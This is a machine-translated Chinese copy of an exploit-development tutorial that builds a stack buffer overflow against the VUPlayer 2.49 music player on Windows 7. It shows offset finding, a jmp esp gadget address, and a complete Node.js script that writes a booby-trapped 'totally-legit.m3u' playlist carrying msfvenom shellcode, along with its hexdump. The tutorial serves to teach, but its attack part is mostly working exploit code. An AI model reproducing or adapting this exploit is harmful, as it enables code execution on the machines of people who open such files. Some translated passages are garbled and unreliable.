<html>
<head>
<title>Windows Exploit Development: A simple buffer overflow example</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Windows漏洞开发:一个简单的缓冲区溢出示例</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/windows-expliot-dev-101-e5311ac284a?source=collection_archive---------0-----------------------#2019-02-07">https://infosecwriteups.com/windows-expliot-dev-101-e5311ac284a?source=collection_archive---------0-----------------------#2019-02-07</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="4570" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在本帖中，我们将为Windows 7上的一个真实应用编写一个漏洞，没有缓解措施(DEP和ASLR)。我们将针对加载播放列表时容易出现缓冲区溢出的VUPLayer 2.49。这是我们的测试对象的样子:</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi kp"><img src="../Images/1d2a3850223da357bb011d4b6d7c322d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*MdIVmG7umGoYk-HE4pambQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">好看的复古GUI)</figcaption></figure></div><div class="ab cl lb lc hx ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="im in io ip iq"><h2 id="040a" class="li lj it bd lk ll lm dn ln lo lp dp lq kb lr ls lt kf lu lv lw kj lx ly lz ma bi translated">第一轮</h2><p id="0a0b" class="pw-post-body-paragraph jq jr it js b jt mb jv jw jx mc jz ka kb md kd ke kf me kh ki kj mf kl km kn im bi translated">为了防止缓冲区溢出，我们使用这个简单的nodejs脚本创建了一个只包含“A”和“B”的长列表:</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="dd8b" class="li lj it mh b gy ml mm l mn mo">const blockSize = 2000<br/>for (let i = 0; i &lt; 3; i++) {<br/>  const char = String.fromCharCode(0x41 + i) // A B<br/>  process.stdout.write(char.repeat(blockSize))<br/>}<br/><strong class="mh iu">&gt;&gt; nodejs 1sttry.js &gt; sample.m3u</strong></span></pre><p id="e9e6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们附加一个调试器，加载样本播放列表并分析崩溃。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/2a017cc7821e74ce9054c4adb2cb3430.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*RTxJyOJDn9VGj09OgzqFrA.gif"/></div></div></figure><p id="657c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们有效地使应用程序崩溃，并用<strong class="js iu">0x 41414141(‘AAAA’)</strong>覆盖EIP。我们确信我们遇到了缓冲区溢出，现在我们需要测量缓冲区的长度，以便用我们想要的任何值覆盖EIP。我们应该尝试用已知的值覆盖ESP和EIP。</p><h2 id="fa52" class="li lj it bd lk ll lm dn ln lo lp dp lq kb lr ls lt kf lu lv lw kj lx ly lz ma bi translated">第二轮</h2><p id="e7c2" class="pw-post-body-paragraph jq jr it js b jt mb jv jw jx mc jz ka kb md kd ke kf me kh ki kj mf kl km kn im bi translated">我们可以尝试使用更小的字节块来提高精度。使用500字节长的块，我们得到指向<strong class="js iu"> 0x0012EEAC </strong>的ESP，其中填充了43(C)。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/e973632999d5bd8d752c492528d94561.png" data-original-src="https://miro.medium.com/v2/resize:fit:616/format:webp/1*Zw-gTaqYVjd9l3OLqRg6_Q.png"/></div></figure><p id="1104" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这里我们可以看到ESP指向<strong class="js iu"> 0x0012EEAC </strong>和在ESP 之前寻址的43(C)s start<strong class="js iu">4。</strong></p><p id="7caf" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">因此，为了达到ESP，我们必须提供500个A、500个B和16个C。</p><h2 id="9dca" class="li lj it bd lk ll lm dn ln lo lp dp lq kb lr ls lt kf lu lv lw kj lx ly lz ma bi translated">第三轮</h2><p id="b02c" class="pw-post-body-paragraph jq jr it js b jt mb jv jw jx mc jz ka kb md kd ke kf me kh ki kj mf kl km kn im bi translated">我们将块大小更改为<strong class="js iu"> 1016字节</strong>以匹配我们的计算，我们成功地达到了预期的esp。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/3a1732434c3e9eeb905cc5f4ddd0a9c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:570/format:webp/1*jeMGs3o_8lTyfyuz7_FETw.png"/></div></figure><p id="688c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们先从ESP开始放1016 'A，然后是1016 'B，然后是1016 'C。</p><p id="e2ca" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们需要知道堆栈有多大。我们可以使用radare2的ragg2实用程序，使用De Bruijn模式对此进行测量</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="a126" class="li lj it mh b gy ml mm l mn mo"><strong class="mh iu">ragg2 -P 2000 -r</strong></span></pre><h2 id="a2f1" class="li lj it bd lk ll lm dn ln lo lp dp lq kb lr ls lt kf lu lv lw kj lx ly lz ma bi translated">第四轮</h2><p id="0654" class="pw-post-body-paragraph jq jr it js b jt mb jv jw jx mc jz ka kb md kd ke kf me kh ki kj mf kl km kn im bi translated">我们的新exploit.js包括一个De Bruijn序列，看起来像这样:</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="905d" class="li lj it mh b gy ml mm l mn mo">const blockSize = 1012</span><span id="f13e" class="li lj it mh b gy mw mm l mn mo">let buf = ''</span><span id="0d81" class="li lj it mh b gy mw mm l mn mo">buf += 'A'.repeat(blockSize)<br/>buf += 'D'.repeat(4) // overrides EIP</span><span id="9c47" class="li lj it mh b gy mw mm l mn mo">const r2pipe = require('r2pipe')<br/>r2pipe.open("/bin/true",function (err, r2) {<br/>  if (err) {<br/>    console.error(err)<br/>  } else {<br/>    r2.syscmd(`<strong class="mh iu">ragg2 -P ${blockSize} -r</strong>`, function(err, o) {<br/>      if (err) {<br/>        console.error(err)<br/>      } else {<br/>        buf += o<br/>        r2.quit()<br/>        process.stdout.write(buf)<br/>      }<br/>    })<br/>  }<br/>})</span></pre><p id="45b0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们来试试吧！</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/d9e50a6fe5b2b6a20083eeb41a00a22e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1136/format:webp/1*dF2gTEFI8iyS_GrvdJrgPQ.png"/></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">太好了！EIP = 0x 4444444 = = ' DDDD '</figcaption></figure><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi my"><img src="../Images/a44d1b717dc31c2988a6df6fc8f3e145.png" data-original-src="https://miro.medium.com/v2/resize:fit:688/format:webp/1*HU87MuiQb9JcwnpoLIkwsw.png"/></div></figure><p id="fae0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们‘A’的组块从<strong class="js iu"> 0x12EAb4 </strong>开始，EIP在<strong class="js iu"> 0x12EEA8 </strong>。使用radare2，我们可以计算地址之间的差异。知道堆栈长度的第三种方法是直接提供一个布鲁日模式，然后在崩溃后得到EIP值的偏移。</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="a222" class="li lj it mh b gy ml mm l mn mo"><strong class="mh iu">ragg2 -P 2000 -r &gt; sample.m3u<br/></strong># this generates a pattern 2000 bytes long</span></pre><p id="21ba" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">加载此样本后，m3u EIP的值为<strong class="js iu"> 0x41684641 </strong>，如我们所料，其偏移量为<strong class="js iu"> 1012 </strong>:</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/d896a157e82aa0c266620223dcee7d8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:538/format:webp/1*nHZ8ZoakhAL-ndilUvL_fA.png"/></div></figure><p id="8b77" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">然后，我们可以通过将这个值减去EIP的内容地址来计算堆栈的开始位置，这个地址是<strong class="js iu"> 0x12EAB4 </strong>(还是和预期的一样)</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi na"><img src="../Images/d5c70746d84fc347cd8a809b80aeeea0.png" data-original-src="https://miro.medium.com/v2/resize:fit:680/format:webp/1*odDN1o7bQ5fhGlzthRcp8A.png"/></div></figure><p id="658e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在这种环境下，我们不能将堆栈中的地址直接放入EIP，因为堆栈地址以<strong class="js iu"> 0x00 </strong>开始，这是一个空字符，会阻止文件的其余部分被加载。我们需要使用间接方法跳转到包含有效载荷的堆栈部分。我们将找到一个包含“jmp esp”指令的地址，并用它覆盖EIP。</p><p id="17ea" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">使用Immunity debugger很容易找到地址:</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/35153cd80ae4f44f01983af102be208e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*BP30t9ouWCMtinZeuSVndA.gif"/></div></div></figure><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="4c70" class="li lj it mh b gy ml mm l mn mo">!searchcode jmp esp<br/># then search for an address on an executable section that contains no null bytes, otherwise the exploit will fail!</span></pre><p id="0541" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是这个小工具的新有效载荷:</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="8592" class="li lj it mh b gy ml mm l mn mo">const fs = require('fs')</span><span id="fe23" class="li lj it mh b gy mw mm l mn mo">const fileName = 'sample.m3u'<br/>const blockSize = 1012</span><span id="ab1e" class="li lj it mh b gy mw mm l mn mo">let buf = ''<br/>buf += 'A'.repeat(blockSize)</span><span id="f189" class="li lj it mh b gy mw mm l mn mo">// overrides EIP with Address :  0x1010539f =&gt; jmp esp<br/>// found with immunity by issuing the command : <strong class="mh iu">!searchcode jmp esp</strong><br/>// the address is on a <strong class="mh iu">PAGE_EXECUTE_READ at BASSWMA.dll</strong><br/>buf += "\x9f\x53\x10\x10"</span><span id="3b43" class="li lj it mh b gy mw mm l mn mo">buf += 'D'.repeat(4) // ESP</span><span id="e73a" class="li lj it mh b gy mw mm l mn mo">fs.writeFile(`./${fileName}`, buf, 'binary')</span></pre><p id="37b4" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">对于新的有效负载，EIP被小工具的地址(<strong class="js iu"> 0x1010539f </strong>)覆盖，我们在其后放置了一个占位符(‘DDDD’)。现在我们需要提供代码来代替占位符运行。</p><h2 id="e39e" class="li lj it bd lk ll lm dn ln lo lp dp lq kb lr ls lt kf lu lv lw kj lx ly lz ma bi translated">第五轮</h2><p id="effb" class="pw-post-body-paragraph jq jr it js b jt mb jv jw jx mc jz ka kb md kd ke kf me kh ki kj mf kl km kn im bi translated">我们可以使用Metasploit的<a class="ae ko" href="https://www.offensive-security.com/metasploit-unleashed/Msfvenom/" rel="noopener ugc nofollow" target="_blank"> <strong class="js iu"> msfvenom </strong> </a>来创建一个用于PoC漏洞利用的公共有效负载。它会弹出一个计算器。命令如下:</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="3e17" class="li lj it mh b gy ml mm l mn mo"><strong class="mh iu">msfvenom -a x86 --platform windows -p windows/exec CMD='calc.exe' -b '\x00\x09\x0a\x0d\x1a\x20' --format python</strong></span></pre><p id="bda0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">确保禁止不良字符(<em class="nb"> -b </em>选项)，以便将整个漏洞载入堆栈。请记住，某些字符(如空字节)可能会提前终止我们的输入。</p><p id="b759" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">添加了Metasploit的外壳代码后，我们的漏洞如下所示:</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="717c" class="li lj it mh b gy ml mm l mn mo">const fs = require('fs')</span><span id="1c85" class="li lj it mh b gy mw mm l mn mo">const fileName = 'totally-legit.m3u'</span><span id="0abd" class="li lj it mh b gy mw mm l mn mo">const stackSize = 1012<br/>const addressSize = 4 // 4 bytes == 1 address<br/>const nopsled = lenght =&gt; '\x90'.repeat(lenght) // 0xcc = nop</span><span id="f363" class="li lj it mh b gy mw mm l mn mo">const payload = () =&gt; {<br/>  // msfvenom -a x86 --platform windows -p windows/exec CMD='calc.exe' -b '\x00\x09\x0a\x0d\x1a\x20' --format python</span><span id="df05" class="li lj it mh b gy mw mm l mn mo">  buf =  ""<br/>  buf += "\xdd\xc3\xba\xad\xd7\xf1\x1e\xd9\x74\x24\xf4\x5f\x31"<br/>  buf += "\xc9\xb1\x31\x31\x57\x18\x83\xef\xfc\x03\x57\xb9\x35"<br/>  buf += "\x04\xe2\x29\x3b\xe7\x1b\xa9\x5c\x61\xfe\x98\x5c\x15"<br/>  buf += "\x8a\x8a\x6c\x5d\xde\x26\x06\x33\xcb\xbd\x6a\x9c\xfc"<br/>  buf += "\x76\xc0\xfa\x33\x87\x79\x3e\x55\x0b\x80\x13\xb5\x32"<br/>  buf += "\x4b\x66\xb4\x73\xb6\x8b\xe4\x2c\xbc\x3e\x19\x59\x88"<br/>  buf += "\x82\x92\x11\x1c\x83\x47\xe1\x1f\xa2\xd9\x7a\x46\x64"<br/>  buf += "\xdb\xaf\xf2\x2d\xc3\xac\x3f\xe7\x78\x06\xcb\xf6\xa8"<br/>  buf += "\x57\x34\x54\x95\x58\xc7\xa4\xd1\x5e\x38\xd3\x2b\x9d"<br/>  buf += "\xc5\xe4\xef\xdc\x11\x60\xf4\x46\xd1\xd2\xd0\x77\x36"<br/>  buf += "\x84\x93\x7b\xf3\xc2\xfc\x9f\x02\x06\x77\x9b\x8f\xa9"<br/>  buf += "\x58\x2a\xcb\x8d\x7c\x77\x8f\xac\x25\xdd\x7e\xd0\x36"<br/>  buf += "\xbe\xdf\x74\x3c\x52\x0b\x05\x1f\x38\xca\x9b\x25\x0e"<br/>  buf += "\xcc\xa3\x25\x3e\xa5\x92\xae\xd1\xb2\x2a\x65\x96\x4d"<br/>  buf += "\x61\x24\xbe\xc5\x2c\xbc\x83\x8b\xce\x6a\xc7\xb5\x4c"<br/>  buf += "\x9f\xb7\x41\x4c\xea\xb2\x0e\xca\x06\xce\x1f\xbf\x28"<br/>  buf += "\x7d\x1f\xea\x4a\xe0\xb3\x76\xa3\x87\x33\x1c\xbb"<br/>  return buf<br/>}</span><span id="885a" class="li lj it mh b gy mw mm l mn mo">let buf = ''<br/>buf += 'A'.repeat(stackSize) // overflow<br/>// overrides EIP with Address :  0x1010539f =&gt; jmp esp<br/>// found with immunity by issuing the command : !searchcode: jmp esp<br/>// the address is on a PAGE_EXECUTE_READ at BASSWMA.dll<br/>buf += "\x9f\x53\x10\x10"<br/>buf += nopsled(addressSize*4) // just in case, not mandatory<br/>buf += payload()</span><span id="9e0a" class="li lj it mh b gy mw mm l mn mo">fs.writeFile(`./${fileName}`, buf, 'binary', () =&gt; console.log(`Done! &gt; ${fileName}`))</span></pre><p id="18cd" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">如果您查看由字节级漏洞创建的列表，您会看到如下内容:</p><pre class="kq kr ks kt gt mg mh mi mj aw mk bi"><span id="178c" class="li lj it mh b gy ml mm l mn mo"><strong class="mh iu">cat totally-legit.m3u | hexdump<br/></strong>------------------------------------------------------------------<br/>0000000 4141 4141 4141 4141 4141 4141 4141 4141 // 'A' block start<br/>*<br/>00003f0 4141 4141 <strong class="mh iu">539f 1010</strong> <em class="nb">9090 9090 9090 9090</em> // gadget + nops<br/>0000400 <em class="nb">9090 9090 9090 9090</em> c3dd adba f1d7 d91e // shellcode starts<br/>0000410 2474 5ff4 c931 31b1 5731 8318 fcef 5703<br/>0000420 35b9 e204 3b29 1be7 5ca9 fe61 5c98 8a15<br/>0000430 6c8a de5d 0626 cb33 6abd fc9c c076 33fa<br/>0000440 7987 553e 800b b513 4b32 b466 b673 e48b<br/>0000450 bc2c 193e 8859 9282 1c11 4783 1fe1 d9a2<br/>0000460 467a db64 f2af c32d 3fac 78e7 cb06 a8f6<br/>0000470 3457 9554 c758 d1a4 385e 2bd3 c59d efe4<br/>0000480 11dc f460 d146 d0d2 3677 9384 f37b fcc2<br/>0000490 029f 7706 8f9b 58a9 cb2a 7c8d 8f77 25ac<br/>00004a0 7edd 36d0 dfbe 3c74 0b52 1f05 ca38 259b<br/>00004b0 cc0e 25a3 a53e ae92 b2d1 652a 4d96 2461<br/>00004c0 c5be bc2c 8b83 6ace b5c7 9f4c 41b7 ea4c<br/>00004d0 0eb2 06ca 1fce 28bf 1f7d 4aea b3e0 a376<br/>00004e0 3387 bb1c<br/>00004e4</span></pre><p id="fcbc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">终于，我们向pwn开拓的时候到了！</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/0aaa611948571544d62a22970f76052e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*-0PEVG2i6Jx_KGbLdf4vwQ.gif"/></div></div></figure><p id="4bbb" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">如果你喜欢这篇文章，你可能想看看这些很棒的教程:</p><ul class=""><li id="d9ad" class="nc nd it js b jt ju jx jy kb ne kf nf kj ng kn nh ni nj nk bi translated"><a class="ae ko" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" rel="noopener ugc nofollow" target="_blank">https://www . corelan . be/index . PHP/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflow/</a></li><li id="852d" class="nc nd it js b jt nl jx nm kb nn kf no kj np kn nh ni nj nk bi translated"><a class="ae ko" href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" rel="noopener ugc nofollow" target="_blank">https://www . corelan . be/index . PHP/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/</a></li></ul></div><div class="ab cl lb lc hx ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="im in io ip iq"><div class="kq kr ks kt gt nq"><a href="https://twitter.com/syscall59" rel="noopener  ugc nofollow" target="_blank"><div class="nr ab fo"><div class="ns ab nt cl cj nu"><h2 class="bd iu gy z fp nv fr fs nw fu fw is bi translated">艾伦(@syscall59) |推特</h2><div class="nx l"><h3 class="bd b gy z fp nv fr fs nw fu fw dk translated">艾伦的最新推文(@syscall59)。功能过多的脚本小子</h3></div><div class="ny l"><p class="bd b dl z fp nv fr fs nw fu fw dk translated">twitter.com</p></div></div><div class="nz l"><div class="oa l ob oc od nz oe kv nq"/></div></div></a></div></div></div>    
</body>
</html>